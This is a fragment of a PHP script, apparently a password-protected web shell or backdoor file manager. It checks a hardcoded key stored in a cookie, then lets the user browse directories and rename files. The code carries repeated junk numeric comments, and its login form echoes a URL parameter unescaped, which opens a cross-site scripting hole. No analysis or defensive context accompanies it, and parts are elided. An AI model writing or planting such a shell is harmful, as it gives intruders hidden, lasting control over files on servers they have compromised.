...
$auth_key = "0a4c0ff41e8d35b4b1634565cc5b561f";
...
$pass = false;
if (isset($_COOKIE['pw_name_44250'])) {
    if(($_COOKIE['pw_name_44250']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_44250'])) {
        if(($_POST['pw_name_44250']) == $auth_key) {
            setcookie("pw_name_44250", $_POST['pw_name_44250']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_44250' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1722462204774249 1722462204395143 1722462204319310 1722462204814509
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1722462204774249 1722462204395143 1722462204319310 1722462204814509
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1722462204774249 1722462204395143 1722462204319310 1722462204814509
            $name = PATH . "/" . $_GET['r'];
